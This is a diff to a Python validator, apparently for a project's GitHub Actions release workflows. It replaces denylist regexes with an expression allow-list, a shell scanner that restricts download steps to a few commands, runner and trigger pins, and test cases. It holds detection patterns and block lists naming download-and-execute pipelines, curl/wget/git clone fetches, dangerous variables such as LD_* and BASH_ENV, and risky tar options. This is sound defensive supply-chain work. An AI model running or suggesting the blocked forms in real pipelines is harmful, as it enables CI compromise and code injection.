@@ -50,7 +50,8 @@ each unit is and WHAT is substituted into it:
     ``target``/``os``/``artifact`` (+ ``nfpm_arch``) and whose values are
     unquoted literals matching a strict pattern (no expression, quote, space or
     shell metacharacter: they are substituted into the pinned build and assert
-    text before bash runs). The target set itself is pinned (``RELEASE_TARGETS``):
+    text before bash runs); an ``os`` value is exactly one of ``HOSTED_RUNNERS``
+    (Round 6: no ``self-hosted``). The target set itself is pinned (``RELEASE_TARGETS``):
     a legitimate matrix change updates that constant in the same commit. This
     pin is deliberate: an exact skeleton is cheaper to keep correct than an
     open-ended list of job keys that can skip, redirect or neutralise the
@@ -151,6 +152,7 @@ from __future__ import annotations
 
 import argparse
 import ast
+import json
 import os
 import re
 import shutil
@@ -159,7 +161,7 @@ import sys
 import tempfile
 from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
-from typing import Callable, Dict, Iterator, List, Optional, Tuple, Union
+from typing import Callable, Dict, Iterable, Iterator, List, Optional, Tuple, Union
 
 HERE = Path(__file__).resolve().parent
 
@@ -451,9 +453,14 @@ RELEASE_TARGETS = (
     "aarch64-apple-darwin",
 )
 MATRIX_REQUIRED = ("target", "os", "artifact")
+# Round 6 (security 3 and 4): a runner is one GitHub-hosted label. The values release.yml uses (ubuntu-latest,
+# ubuntu-24.04-arm, macos-15-intel, macos-latest) plus the pinned siblings; `self-hosted` and any expression are refused.
+HOSTED_RUNNERS = ("ubuntu-latest", "ubuntu-22.04", "ubuntu-24.04", "ubuntu-24.04-arm", "macos-latest", "macos-14",
+                  "macos-15", "macos-15-intel", "windows-latest")
+
 MATRIX_VALUE_RE = {
     "target": re.compile(r"[a-z0-9_]+(?:-[a-z0-9_]+){2,3}"),
-    "os": re.compile(r"[a-z0-9]+(?:[.-][a-z0-9]+)*"),
+    "os": re.compile("|".join(re.escape(r) for r in HOSTED_RUNNERS)),
     "artifact": re.compile(r"ai-memory"),
     "nfpm_arch": re.compile(r"[a-z0-9_]+"),
 }
@@ -608,6 +615,7 @@ class Report:
     def __init__(self) -> None:
         self.errors: List[str] = []
         self.root: Optional[Path] = None  # the tree being checked (local actions are read from it)
+        self.walked: set = set()  # resolved local-action directories already walked (Round 6, R4-3)
 
     def bad(self, msg: str) -> None:
         self.errors.append(msg)
@@ -1236,12 +1244,509 @@ DOCKER_USES_RE = re.compile(r"docker://[a-z0-9][a-z0-9_./:-]*@sha256:[0-9a-f]{64
 # Round 5 (F4): a `run:` never downloads and executes, and never splices an attacker-influenced
 # expression into the script text (it belongs in `env:` and is quoted in the script).
 EXPR_RE = re.compile(r"\$\{\{(.*?)\}\}", re.S)
-UNTRUSTED_RE = re.compile(r"(?<![\w.-])(?:github\s*\.\s*(?:event|head_ref|ref_name)(?![\w-])"
-                          r"|github\s*\[\s*['\"](?:event|head_ref|ref_name)|inputs(?![\w-]))", re.I)
-_FETCH = r"(?<![\w.-])(?:curl|wget)(?![\w-])"
-EXEC_WORD_RE = re.compile(r"(?<![\w.-])(?:sh|bash|zsh|dash|ksh|python[0-9.]*|perl|ruby|node|php|eval|source)(?![\w-])|^\s*\.\s", re.I)
-PIPE_EXEC_RE = re.compile(_FETCH + r"[^|\n]*\|\s*(?:sudo\s+)?(?:env\s+\S+\s+)*(?:\S*/)?(?:sh|bash|zsh|dash|ksh|python[0-9.]*|perl|ruby|node|php)(?![\w-])", re.I)
-SUBST_FETCH_RE = re.compile(r"(?:\$\(|<\(|`)\s*" + _FETCH, re.I)
+# Round 6 (3-agent vote 6def5ab6, option B, 3-0): the denylist regexes of round 5 are gone (two rounds of
+# splice and download-execute forms slipped past them). A `${{ }}` expression in `run:` text is allowed only as
+# a bare `matrix.<key>`, `secrets.<NAME>` or `steps.<id>.outputs.<name>` path, and a step that fetches may run
+# only the commands of FETCH_ALLOWED; everything else is refused, so a new form fails closed.
+EXPR_PATH_RE = re.compile(r"[A-Za-z_][A-Za-z0-9_-]*(?:\.[A-Za-z_][A-Za-z0-9_-]*)*")
+SHA_USES_RE = re.compile(r"[^@\s]+@[0-9a-f]{40}")
+TAINT_ENV_RE = re.compile(r"\$\{?GITHUB_(?:HEAD_REF|REF_NAME|REF|BASE_REF|EVENT_PATH|ACTOR|TRIGGERING_ACTOR)(?![A-Za-z0-9_])")
+# Case-folded and matched anywhere in a word (also inside `sh -c '...'`): a false positive only makes a step
+# subject to the allow-list, never exempt from it.
+FETCH_WORD_RE = re.compile(r"(?<![\w.-])(?:curl|wget|Invoke-WebRequest|iwr|git\s+clone)(?![\w-])", re.I)
+FETCH_ALLOWED = ("curl", "wget", "sha256sum", "shasum", "tar", "unzip", "mkdir", "mv", "cp", "cd", "echo", "test", "[",
+                 "ls", "chmod")
+FETCH_FILE_RE = re.compile(r"GITHUB_(?:ENV|PATH)(?![A-Za-z0-9_])")  # a fetch step never edits the next steps' env or PATH
+DANGEROUS_ASSIGN_RE = re.compile(r"LD_\w*|DYLD_\w*|BASH_ENV|ENV|PATH|IFS|PS4|CDPATH|SHELLOPTS|PYTHONPATH|PYTHONSTARTUP|"
+                                 r"NODE_OPTIONS|PERL5OPT|PERL5LIB|RUBYOPT|RUBYLIB|GIT_\w*|CURL_HOME")
+TAR_FLAGS_RE = re.compile(r"-?[xzfvCjJtpmkO]+")  # no -I / --use-compress-program / --to-command / --checkpoint-action
+TAR_LONG_RE = re.compile(r"--(?:strip-components=[0-9]+|no-same-owner|no-same-permissions)")
+RUNS_ON_MATRIX_RE = re.compile(r"\$\{\{\s*matrix\.os\s*\}\}")
+# Round 6 (security 5): triggers no guarded workflow may have, and the canonical JSON of each `on:` block.
+ON_FORBIDDEN = ("workflow_call", "pull_request_target", "repository_dispatch")
+ON_PINS: Dict[str, str] = {
+    'release.yml':
+        '{"workflow_dispatch":{"inputs":{"dry_run":{"default":"true","type":"boolean"},"tag":{"required":"true"}}}}',
+    'c8-precheck.yml':
+        '{"merge_group":{"types":"checks_requested"},"pull_request":{"branches":"main, develop, \\"release/**\\", \\"rehearsal/**\\", \\"chain/**\\""},"push":{"branches":"main, develop, \\"release/**\\""}}',
+    'publish-ci-image.yml':
+        '{"push":{"branches":"\\"release/**\\"","paths":[".github/Dockerfile.ci",".github/workflows/publish-ci-image.yml","deploy/docker-1461/provision/lib.sh"]},"workflow_dispatch":null}',
+}
+
+
+class RunCtx:
+    """What a `run:` text may name: the matrix keys of its job and the ids of its same-job steps that are safe
+    (a `run:` step, or a `uses:` step pinned by 40-hex sha) and not tainted."""
+
+    def __init__(self, matrix: Iterable[str] = (), safe: Iterable[str] = (), tainted: Iterable[str] = ()) -> None:
+        self.matrix = frozenset(matrix)
+        self.safe = frozenset(safe)
+        self.tainted = frozenset(tainted)
+
+
+def expr_allowed(expr: str, ctx: RunCtx) -> bool:
+    """True only for a bare property path rooted at matrix.<key>, secrets.<NAME> or steps.<id>.outputs.<name>."""
+    path = expr.strip()
+    if not EXPR_PATH_RE.fullmatch(path):
+        return False
+    parts = path.split(".")
+    if parts[0] == "matrix":
+        return len(parts) == 2 and parts[1] in ctx.matrix
+    if parts[0] == "secrets":
+        return len(parts) == 2
+    if parts[0] == "steps":
+        return len(parts) == 4 and parts[2] == "outputs" and parts[1] in ctx.safe and parts[1] not in ctx.tainted
+    return False
+
+
+def run_text(run: Node) -> Optional[str]:
+    if run.kind == "block" and isinstance(run.value, list):
+        return "\n".join(run.value)
+    return run.text() if run.kind == "scalar" else None
+
+
+def step_exprs(step: Node) -> List[str]:
+    """Every `${{ }}` body in a step's run text and env values."""
+    texts: List[str] = []
+    run = step.get("run")
+    body = run_text(run) if run is not None else None
+    if body is not None:
+        texts.append(body)
+    env = step.get("env")
+    if env is not None:
+        for _path, sub in walk(env):
+            if sub.kind == "scalar":
+                texts.append(sub.text())
+            elif sub.kind == "block" and isinstance(sub.value, list):
+                texts.append("\n".join(sub.value))
+    return [m.group(1) for t in texts for m in EXPR_RE.finditer(t)]
+
+
+def run_context(steps: Optional[Node], matrix: Iterable[str]) -> RunCtx:
+    """The safe and tainted step ids of one job (or composite action). A step that writes `$GITHUB_OUTPUT` while it
+    references a root outside the allow-list (in its env or text) is tainted, and so are the steps that read it."""
+    nodes = steps.value if steps is not None and steps.kind == "seq" and isinstance(steps.value, list) else []
+    safe: set = set()
+    writers: List[Tuple[str, Node, str]] = []
+    for step in nodes:
+        ident = step.get("id") if step.kind == "map" else None
+        if ident is None or ident.kind != "scalar":
+            continue
+        sid, run, uses = ident.text().strip(), step.get("run"), step.get("uses")
+        if run is not None:
+            safe.add(sid)
+            body = run_text(run) or ""
+            if "GITHUB_OUTPUT" in body:
+                writers.append((sid, step, body))
+        elif uses is not None and uses.kind == "scalar" and SHA_USES_RE.fullmatch(uses.text().strip()):
+            safe.add(sid)
+    tainted: set = set()
+    changed = True
+    while changed:
+        changed = False
+        ctx = RunCtx(matrix, safe, tainted)
+        for sid, step, body in writers:
+            if sid not in tainted and (TAINT_ENV_RE.search(body) or not all(expr_allowed(e, ctx) for e in step_exprs(step))):
+                tainted.add(sid)
+                changed = True
+    return RunCtx(matrix, safe, tainted)
+
+
+def matrix_keys(job: Node) -> List[str]:
+    """The keys a `matrix.<key>` expression may name: the axes and the keys of the include entries."""
+    st = job.get("strategy")
+    matrix = st.get("matrix") if st is not None else None
+    keys: List[str] = []
+    if matrix is None or matrix.kind != "map" or not isinstance(matrix.value, dict):
+        return keys
+    for key, val in matrix.value.items():
+        if key == "include":
+            for entry in val.value if val.kind == "seq" and isinstance(val.value, list) else []:
+                keys.extend(entry.keys())
+        elif key != "exclude":
+            keys.append(key)
+    return keys
+
+
+def matrix_os_values(job: Node) -> List[str]:
+    """Every `os` of a job's matrix (an axis list, a flow list or include entries)."""
+    st = job.get("strategy")
+    matrix = st.get("matrix") if st is not None else None
+    if matrix is None or matrix.kind != "map":
+        return []
+    out: List[str] = []
+    axis = matrix.get("os")
+    if axis is not None and axis.kind == "seq" and isinstance(axis.value, list):
+        out.extend(n.text().strip() for n in axis.value)
+    elif axis is not None and axis.kind == "scalar":
+        text = axis.text().strip()
+        inner = text[1:-1] if text.startswith("[") and text.endswith("]") else text
+        out.extend(p.strip().strip("'\"") for p in inner.split(","))
+    include = matrix.get("include")
+    for entry in include.value if include is not None and include.kind == "seq" and isinstance(include.value, list) else []:
+        val = entry.get("os")
+        out.append(val.text().strip() if val is not None and val.kind == "scalar" else "")
+    return out
+
+
+# ------------------------------------------------------- shell scanner --
+SHELL_CMD_KW = frozenset(("if", "then", "elif", "else", "while", "until", "do", "!", "{", "time"))
+SHELL_END_KW = frozenset(("fi", "done", "esac", "}"))
+SHELL_NOOP = frozenset(("set", "exit", ":", "true", "false", "break", "continue", "return"))
+SHELL_ASSIGN_RE = re.compile(r"([A-Za-z_][A-Za-z0-9_]*)\+?=")
+
+
+class ShellError(Exception):
+    """The script text is outside what the scanner understands (a step that fetches then fails closed)."""
+
+
+class ShellLevel:
+    """The parse state of one command list (the top level, a `$(...)`, a backtick or a `<(...)`)."""
+
+    def __init__(self) -> None:
+        self.cmd_pos = True
+        self.expect = ""
+        self.wordlist = False
+        self.skip = False
+        self.paren = 0
+        self.cases: List[str] = []
+        self.cur: Optional[List[Tuple[str, bool]]] = None
+
+
+class ShellScan:
+    """Round 6: the command words of a shell script, comments and here-document bodies excluded. ``cmds`` holds
+    (word, literal, args) per command; a word is literal only when it has no quote, escape or expansion. ``words``
+    is the decoded text of every word, ``assigns`` the names assigned in command position."""
+
+    def __init__(self, text: str) -> None:
+        self.s = text.replace("\\\n", "")
+        self.n = len(self.s)
+        self.i = 0
+        self.cmds: List[Tuple[str, bool, List[Tuple[str, bool]]]] = []
+        self.words: List[str] = []
+        self.assigns: List[str] = []
+        self.heredocs = 0
+        self.pending: List[Tuple[str, bool]] = []
+        self.scan(None)
+
+    def word(self, text: str, lit: bool, lv: ShellLevel) -> None:
+        self.words.append(text)
+        if lv.skip:
+            lv.skip = False
+            return
+        if lv.cases and lv.cases[-1] == "pat":
+            if lit and text == "esac":
+                lv.cases.pop()
+                lv.cmd_pos = False
+            return
+        ex, lv.expect = lv.expect, ""
+        if ex == "for_var":
+            lv.expect = "for_in"
+            return
+        if ex == "for_in" and lit and text == "in":
+            lv.wordlist = True
+            return
+        if ex == "case_subj":
+            lv.expect = "case_in"
+            return
+        if ex == "case_in" and lit and text == "in":
+            lv.cases.append("pat")
+            return
+        if lv.wordlist:
+            return
+        if not lv.cmd_pos:
+            if lv.cur is not None:
+                lv.cur.append((text, lit))
+            return
+        m = SHELL_ASSIGN_RE.match(text)
+        if m is not None:
+            self.assigns.append(m.group(1))
+            return
+        if lit and text in SHELL_CMD_KW:
+            return
+        if lit and text in ("for", "select"):
+            lv.expect, lv.cmd_pos = "for_var", False
+            return
+        if lit and text == "case":
+            lv.expect, lv.cmd_pos = "case_subj", False
+            return
+        if lit and text == "esac" and lv.cases:
+            lv.cases.pop()
+            lv.cmd_pos = False
+            return
+        if lit and (text in SHELL_END_KW or text in SHELL_NOOP):
+            lv.cmd_pos = False
+            return
+        lv.cur = []
+        self.cmds.append((text, lit, lv.cur))
+        lv.cmd_pos = False
+
+    def separator(self, lv: ShellLevel, op: str) -> None:
+        lv.cmd_pos, lv.wordlist, lv.skip, lv.expect, lv.cur = True, False, False, "", None
+        if op == ";;" and lv.cases:
+            lv.cases[-1] = "pat"
+
+    def newline(self, lv: ShellLevel) -> None:
+        self.separator(lv, "\n")
+        while self.pending:
+            delim, strip = self.pending.pop(0)
+            body: List[str] = []
+            while True:
+                if self.i >= self.n:
+                    raise ShellError("here-document not terminated")
+                j = self.s.find("\n", self.i)
+                line = self.s[self.i:self.n if j < 0 else j]
+                self.i = self.n if j < 0 else j + 1
+                if (line.lstrip("\t") if strip else line) == delim:
+                    break
+                body.append(line)
+            self.words.append("\n".join(body))
+
+    def operator(self, lv: ShellLevel) -> None:
+        two = self.s[self.i:self.i + 2]
+        if two == "&>":
+            self.i += 1
+            self.redirect(lv)
+        elif two in ("&&", "||", ";;", ";&", "|&"):
+            self.i += 2
+            self.separator(lv, two)
+        else:
+            self.i += 1
+            self.separator(lv, two[0])
+
+    def heredoc_delim(self) -> str:
+        while self.i < self.n and self.s[self.i] in " \t":
+            self.i += 1
+        out: List[str] = []
+        while self.i < self.n and self.s[self.i] not in " \t\n;&|()<>":
+            if self.s[self.i] not in "'\"\\":
+                out.append(self.s[self.i])
+            self.i += 1
+        if not out:
+            raise ShellError("here-document without a delimiter")
+        return "".join(out)
+
+    def redirect(self, lv: ShellLevel) -> None:
+        s, i = self.s, self.i
+        if s[i:i + 3] == "<<<":
+            self.i += 3
+            lv.skip = True
+        elif s[i:i + 2] == "<<":
+            self.i += 2
+            strip = s[self.i:self.i + 1] == "-"
+            self.i += 1 if strip else 0
+            self.pending.append((self.heredoc_delim(), strip))
+            self.heredocs += 1
+        elif s[i:i + 2] in ("<(", ">("):
+            self.i += 2
+            self.scan(")")
+            lv.skip = False
+        else:
+            self.i += 1
+            if s[self.i:self.i + 1] in (">", "|", "&", "<") if s[i] == ">" else s[self.i:self.i + 1] in ("&", ">"):
+                self.i += 1
+            lv.skip = True
+
+    def braced(self, j: int) -> int:
+        """The index after the `}` that closes a `${` whose body starts at ``j``."""
+        s, depth = self.s, 1
+        while j < self.n:
+            c = s[j]
+            if c == "\\":
+                j += 1
+            elif c in "'\"":
+                j = s.find(c, j + 1)
+                if j < 0:
+                    raise ShellError("unterminated quote in `${...}`")
+            elif c == "`" or s[j:j + 2] == "$(":
+                raise ShellError("command substitution inside `${...}`")
+            elif c == "{":
+                depth += 1
+            elif c == "}":
+                depth -= 1
+                if depth == 0:
+                    return j + 1
+            j += 1
+        raise ShellError("unterminated `${`")
+
+    def dollar(self) -> str:
+        s, i = self.s, self.i
+        nxt = s[i + 1:i + 2]
+        if s[i + 1:i + 3] == "((":
+            depth, j = 2, i + 3
+            while j < self.n and depth:
+                depth += 1 if s[j] == "(" else -1 if s[j] == ")" else 0
+                j += 1
+            if depth:
+                raise ShellError("unterminated `$((`")
+            self.i = j
+            return "$(())"
+        if nxt == "(":
+            self.i += 2
+            self.scan(")")
+            return "$()"
+        if nxt == "{":
+            self.i = self.braced(i + 2)
+            return "${}"
+        if nxt.isalpha() or nxt == "_":
+            j = i + 1
+            while j < self.n and (s[j].isalnum() or s[j] == "_"):
+                j += 1
+            self.i = j
+            return s[i:j]
+        if nxt and (nxt.isdigit() or nxt in "#?@*!$-"):
+            self.i += 2
+            return s[i:i + 2]
+        self.i += 1
+        return "$"
+
+    def dquote(self) -> str:
+        s, out = self.s, []
+        while self.i < self.n:
+            c = s[self.i]
+            if c == '"':
+                self.i += 1
+                return "".join(out)
+            if c == "\\" and self.i + 1 < self.n:
+                out.append(s[self.i + 1])
+                self.i += 2
+            elif c == "$":
+                out.append(self.dollar())
+            elif c == "`":
+                self.i += 1
+                self.scan("`")
+                out.append("`")
+            else:
+                out.append(c)
+                self.i += 1
+        raise ShellError("unterminated double quote")
+
+    def scan(self, closer: Optional[str]) -> None:
+        s, lv = self.s, ShellLevel()
+        buf: List[str] = []
+        lit, have = True, False
+
+        def end_word() -> None:
+            nonlocal buf, lit, have
+            if have:
+                self.word("".join(buf), lit, lv)
+            buf, lit, have = [], True, False
+
+        while True:
+            if self.i >= self.n:
+                end_word()
+                if closer is not None:
+                    raise ShellError("unterminated command substitution")
+                if self.pending:
+                    raise ShellError("here-document body missing")
+                return
+            c = s[self.i]
+            if c == "\\":
+                if self.i + 1 >= self.n:
+                    raise ShellError("trailing backslash")
+                buf.append(s[self.i + 1])
+                lit, have = False, True
+                self.i += 2
+            elif c == "'":
+                j = s.find("'", self.i + 1)
+                if j < 0:
+                    raise ShellError("unterminated single quote")
+                buf.append(s[self.i + 1:j])
+                lit, have = False, True
+                self.i = j + 1
+            elif c == '"':
+                self.i += 1
+                buf.append(self.dquote())
+                lit, have = False, True
+            elif c == "$":
+                buf.append(self.dollar())
+                lit, have = False, True
+            elif c == "`":
+                self.i += 1
+                if closer == "`":
+                    end_word()
+                    return
+                self.scan("`")
+                buf.append("`")
+                lit, have = False, True
+            elif c == "#" and not have:
+                j = s.find("\n", self.i)
+                self.i = self.n if j < 0 else j
+            elif c in " \t":
+                end_word()
+                self.i += 1
+            elif c == "\n":
+                end_word()
+                self.i += 1
+                self.newline(lv)
+            elif c in ";&|":
+                end_word()
+                self.operator(lv)
+            elif c == "(":
+                end_word()
+                self.i += 1
+                if lv.cases and lv.cases[-1] == "pat":
+                    continue
+                if not lv.cmd_pos:
+                    raise ShellError("unexpected `(`")
+                lv.paren += 1
+            elif c == ")":
+                end_word()
+                self.i += 1
+                if lv.cases and lv.cases[-1] == "pat":
+                    lv.cases[-1], lv.cmd_pos = "body", True
+                elif lv.paren > 0:
+                    lv.paren -= 1
+                    lv.cmd_pos = False
+                elif closer == ")":
+                    return
+                else:
+                    raise ShellError("unbalanced `)`")
+            elif c in "<>":
+                if have and lit and "".join(buf).isdigit():
+                    buf, lit, have = [], True, False
+                else:
+                    end_word()
+                self.redirect(lv)
+            else:
+                buf.append(c)
+                have = True
+                self.i += 1
+
+
+def fetch_problem(raw: str) -> str:
+    """Round 6 (vote 6def5ab6): "" unless ``raw`` is a fetch step (curl, wget, Invoke-WebRequest, iwr or git clone
+    in any word) that runs a command outside FETCH_ALLOWED; then the reason."""
+    text = EXPR_RE.sub("$__GHX__", raw)
+    try:
+        scan = ShellScan(text)
+    except ShellError as err:
+        return f"text the scanner cannot read ({err})" if FETCH_WORD_RE.search(text) else ""
+    clone = any(w == "git" and any(a == "clone" for a, _l in args) for w, _lit, args in scan.cmds)
+    if not clone and not any(FETCH_WORD_RE.search(w) for w in scan.words):
+        return ""
+    if scan.heredocs:
+        return "a here-document"
+    for name in scan.assigns:
+        if DANGEROUS_ASSIGN_RE.fullmatch(name):
+            return f"an assignment to `{name}`"
+    if any(FETCH_FILE_RE.search(w) for w in scan.words):
+        return "a write to GITHUB_ENV or GITHUB_PATH"
+    for word, literal, args in scan.cmds:
+        if not literal or word not in FETCH_ALLOWED:
+            return f"the command `{word[:40]}`"
+        if word == "tar":
+            for n, (arg, _lit) in enumerate(args):
+                if arg.startswith("--"):
+                    ok = TAR_LONG_RE.fullmatch(arg) is not None
+                else:
+                    ok = arg.startswith("-") or n == 0
+                    ok = TAR_FLAGS_RE.fullmatch(arg) is not None if ok else True
+                if not ok:
+                    return f"the tar option `{arg[:40]}`"
+    return ""
+
+
 MAX_LOCAL_DEPTH = 8  # nested local composite actions followed before a chain is refused
 
 
@@ -1315,6 +1820,9 @@ def check_local_action(ref: str, node: Node, name: str, where: str, rep: Report,
     if len(chain) >= MAX_LOCAL_DEPTH:
         rep.bad(f"{here} nests more than {MAX_LOCAL_DEPTH} local actions deep")
         return
+    if target in rep.walked:
+        return  # Round 6 (R4-3): an action reached again by a fan-out is walked once
+    rep.walked.add(target)
     action = next((target / f for f in ("action.yml", "action.yaml") if (target / f).is_file()), None)
     if action is None:
         rep.bad(f"{here} has no action.yml or action.yaml (a local action that cannot be read is not inspected)")
@@ -1334,6 +1842,7 @@ def check_local_action(ref: str, node: Node, name: str, where: str, rep: Report,
         if steps is None or steps.kind != "seq" or not steps.value:
             rep.bad(f"{here}: `runs.steps` must be a non-empty list")
             return
+        ctx = run_context(steps, ())
         for i, step in enumerate(steps.value):
             where_step = f"local action `{rel}` step {i + 1}"
             if step.kind != "map":
@@ -1342,7 +1851,7 @@ def check_local_action(ref: str, node: Node, name: str, where: str, rep: Report,
             uses = step.get("uses")
             if uses is not None:
                 check_ref(uses, label, where_step, rep, False, chain + (target,))
-            check_run(step, label, where_step, rep)
+            check_run(step, label, where_step, rep, ctx)
     elif kind == "docker":
         image = runs.get("image") if runs is not None else None
         if image is None or image.kind != "scalar" or not DOCKER_USES_RE.fullmatch(image.text().strip()):
@@ -1356,26 +1865,78 @@ def check_local_action(ref: str, node: Node, name: str, where: str, rep: Report,
         rep.bad(f"{here}: `runs.using` must be `composite`, `docker` or `node*` (got `{kind[:30]}`)")
 
 
-def check_run(step: Node, name: str, where: str, rep: Report) -> None:
-    """Round 5 (F4): no download-and-execute and no attacker-influenced expression in a `run:` script."""
+def check_run(step: Node, name: str, where: str, rep: Report, ctx: RunCtx) -> None:
+    """Round 6 (vote 6def5ab6): a `run:` names only allow-listed expression roots, and a fetch step runs only
+    the commands of FETCH_ALLOWED."""
     run = step.get("run")
     if run is None:
         return
-    if run.kind == "block" and isinstance(run.value, list):
-        raw, logical = "\n".join(run.value), logical_lines(run.value)
-    elif run.kind == "scalar":
-        raw, logical = run.text(), logical_lines([run.text()])
-    else:
+    raw = run_text(run)
+    if raw is None:
         rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` must be a scalar or a block (got {run.kind})")
         return
     for m in EXPR_RE.finditer(raw):
-        if UNTRUSTED_RE.search(m.group(1)):
+        if not expr_allowed(m.group(1), ctx):
             rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` interpolates `{m.group(0)[:60]}` into the script "
-                    "(Round 5: pass an attacker-influenced value through `env:` and quote it in the script)")
-    for ln in logical:
-        if PIPE_EXEC_RE.search(ln) or (SUBST_FETCH_RE.search(ln) and EXEC_WORD_RE.search(ln)):
-            rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` downloads and executes: `{ln[:60]}` "
-                    "(Round 5: download to a file, verify its digest, then run it)")
+                    "(Round 6: only matrix.<key>, secrets.<NAME> and steps.<id>.outputs.<name> of a safe step of the "
+                    "same job may appear in run text; pass any other value through `env:` and quote it in the script)")
+    problem = fetch_problem(raw)
+    if problem:
+        rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` is a fetch step that runs {problem} "
+                "(Round 6, 3-agent vote 6def5ab6: a step that downloads may run only "
+                f"{', '.join(FETCH_ALLOWED)}; split it into a fetch step and a use step)")
+
+
+def check_runs_on(job: Node, name: str, jname: str, rep: Report) -> None:
+    """Round 6 (security 3, 4): a job runs on one hosted label, or on `${{ matrix.os }}` of a hosted-only matrix."""
+    ro = job.get("runs-on")
+    if ro is None:
+        return  # a reusable-workflow job has none; a missing one is actionlint's
+    text = ro.text().strip() if ro.kind == "scalar" and ro.style == "plain" else ""  # a flow list `[x]` is not a label
+    ok = text in HOSTED_RUNNERS
+    if not ok and RUNS_ON_MATRIX_RE.fullmatch(text):
+        values = matrix_os_values(job)
+        ok = bool(values) and all(v in HOSTED_RUNNERS for v in values)
+    if not ok:
+        rep.bad(f"{name}: job `{jname}`: line {ro.line + 1}: `runs-on` must be a hosted label "
+                f"({', '.join(HOSTED_RUNNERS)}) or `${{{{ matrix.os }}}}` of a matrix whose `os` values are all hosted "
+                f"(got `{(text or ro.kind)[:40]}`)")
+
+
+def on_canon(node: Node) -> object:
+    """The `on:` block as plain data (descriptions dropped) for the ON_PINS comparison."""
+    if node.kind == "scalar":
+        return node.text()
+    if node.kind == "seq":
+        return [on_canon(n) for n in node.value]  # type: ignore[union-attr]
+    if node.kind == "map":
+        return {k: on_canon(v) for k, v in node.value.items() if k != "description"}  # type: ignore[union-attr]
+    return None
+
+
+def on_triggers(node: Node) -> List[str]:
+    if node.kind == "map":
+        return list(node.keys())
+    if node.kind == "seq":
+        return [n.text().strip() for n in node.value if n.kind == "scalar"]  # type: ignore[union-attr]
+    if node.kind == "scalar":
+        return [p for p in re.split(r"[\s,\[\]]+", node.text()) if p]
+    return []
+
+
+def check_on(doc: Node, name: str, rep: Report) -> None:
+    """Round 6 (security 5): no workflow_call, pull_request_target or repository_dispatch trigger, and the `on:`
+    block of release.yml, c8-precheck.yml and publish-ci-image.yml is pinned."""
+    on = doc.get("on")
+    if on is None:
+        return
+    bad = [t for t in on_triggers(on) if t in ON_FORBIDDEN]
+    if bad:
+        rep.bad(f"{name}: `on:` line {on.line + 1}: trigger `{bad[0]}` is not allowed (no guarded workflow may be "
+                f"called, or run with a write token on a fork's code, or be dispatched from outside: {', '.join(ON_FORBIDDEN)})")
+    pin = ON_PINS.get(name)
+    if pin is not None and json.dumps(on_canon(on), sort_keys=True, separators=(",", ":")) != pin:
+        rep.bad(pin_message(f"{name}: `on:` line {on.line + 1}", "the trigger block differs from its pin", "ON_PINS"))
 
 
 def check_images(job: Node, name: str, jname: str, rep: Report) -> None:
@@ -1416,17 +1977,20 @@ def check_jobs_shape(doc: Node, name: str, rep: Report) -> None:
                 needs.kind == "seq" and all(n.kind == "scalar" for n in needs.value))):  # type: ignore[union-attr]
             rep.bad(f"{where}: line {needs.line + 1}: `needs` must be a string or a list of strings")
         check_images(job, name, jname, rep)
+        if not (name == "release.yml" and jname == "release"):  # pinned by check_release_job and check_matrix
+            check_runs_on(job, name, jname, rep)
         steps = job.get("steps")
         if job.get("uses") is not None and steps is None:
             continue  # a reusable-workflow job has no steps; its `uses` is pinned by check_ref
         if steps is None or steps.kind != "seq" or not steps.value:
             rep.bad(f"{where}: `steps` must be a non-empty list (got {'nothing' if steps is None else steps.kind})")
             continue
+        ctx = run_context(steps, matrix_keys(job))
         for i, step in enumerate(steps.value):  # type: ignore[union-attr]
             if step.kind != "map":
                 rep.bad(f"{where} step {i + 1}: line {step.line + 1}: a step must be a mapping (got {step.kind})")
                 continue
-            check_run(step, name, f"job `{jname}` step {i + 1}", rep)
+            check_run(step, name, f"job `{jname}` step {i + 1}", rep, ctx)
 
 
 def check_uses_pinned(doc: Node, name: str, rep: Report) -> None:
@@ -1439,6 +2003,7 @@ def check_uses_pinned(doc: Node, name: str, rep: Report) -> None:
         if not path or path[-1] != "uses":
             continue
         check_ref(node, name, uses_where(doc, path), rep, name == "release.yml" and path[:2] == ("jobs", "docker"), ())
+    check_on(doc, name, rep)
     check_jobs_shape(doc, name, rep)
 
 
@@ -2532,6 +3097,8 @@ MESSAGE_CASES: Dict[str, Tuple[List[Edit], int, str]] = {
                                                         "update LOGIN_USES in scripts/check_release_features.py"),
     "message: IMAGE_BUILD_USES SHA bump": ([_rel(IMAGE_BUILD_USES, IMAGE_BUILD_USES[:-1] + "0")], 1,
                                            "update IMAGE_BUILD_USES in scripts/check_release_features.py"),
+    "message: the on: block of release.yml is pinned": ([(REL, "        default: true\n", "        default: false\n", False)], 1,
+                                                       "update ON_PINS in scripts/check_release_features.py"),
     "message: a checkout repin names the constant": ([_rel("", _job_edit("crates-io", _first_checkout_to_other_sha))], 1,
                                                      "differs from CHECKOUT_USES"),
     # Round-3 cells (#8039): the SHAPE_STEPS and uses: pins now refuse the inputs that once reached ONLY the
@@ -2556,6 +3123,14 @@ MESSAGE_CASES: Dict[str, Tuple[List[Edit], int, str]] = {
 # Round 5 (#8003): the new job-shape checks refuse these inputs too, so the older, more specific refusals are
 # proven by their own message appearing anywhere in the refusal list (a neutralised refusal drops the needle).
 JOINED_CASES: Dict[str, Tuple[List[Edit], str]] = {
+    # Round 6: the expression allow-list now also refuses `matrix.target` outside the release job, so the text-count
+    # backstop is proven by its own message.
+    "joined: a second matrix-target build in another job is counted": (
+        [_rel(SBOM_HDR, "      - name: x\n        run: cargo build --target ${{ matrix.target }}\n" + SBOM_HDR)],
+        "lines run a build tool against the matrix target"),
+    "joined: a second matrix-target build spelled c''argo in another job is counted": (
+        [_rel(SBOM_HDR, "      - name: x\n        run: c''argo build --target ${{ matrix.target }}\n" + SBOM_HDR)],
+        "lines run a build tool against the matrix target"),
     "joined: a docker job that is not a mapping names the GHCR push": (
         [_rel("", _job_edit("docker", lambda body: "  docker: nope\n"))],
         "the `docker:` job is missing or not a mapping"),
@@ -2690,7 +3265,7 @@ R5_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
     "r5: a composite step that is a scalar is refused": (_r5_job(steps="    steps:\n" + R5_LOCAL), _r5_act(_r5_comp("    - just\n")), 1, "a step must be a mapping"),
